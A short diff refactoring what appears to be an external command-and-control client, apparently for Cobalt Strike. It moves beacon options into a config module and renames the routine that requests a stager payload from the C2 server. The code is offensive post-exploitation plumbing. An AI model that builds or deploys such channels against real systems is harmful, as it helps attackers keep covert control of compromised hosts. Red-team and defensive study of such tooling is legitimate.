@@ -1,3 +1,5 @@
+import config
+
 def configureOptions(sock, arch, pipename, block):
 	# This whole function should eventually be refactored into an elaborate forloop so that we can
 	#   support additional beacon options down the road
@@ -27,15 +29,15 @@ def requestStager(sock):
 
 	return stager_payload
 
-def main(sock):
+def loadStager(sock):
 	# Send options to the external_c2 server
-	configureStage.configureOptions(sock, C2_ARCH, C2_PIPE_NAME, C2_BLOCK_TIME)
+	configureOptions(sock, config.C2_ARCH, config.C2_PIPE_NAME, config.C2_BLOCK_TIME)
 
 	if args.debug:
 		print commonUtils.color("stager configured, sending 'go'", status=False, yellow=True)
 
 	# Request stager
-	stager_payload = configureStage.requestStager(sock)
+	stager_payload = requestStager(sock)
 
 	if args.debug:
 		print (commonUtils.color("STAGER: ", status=False, yellow=True) + "%s") % (stager_payload)
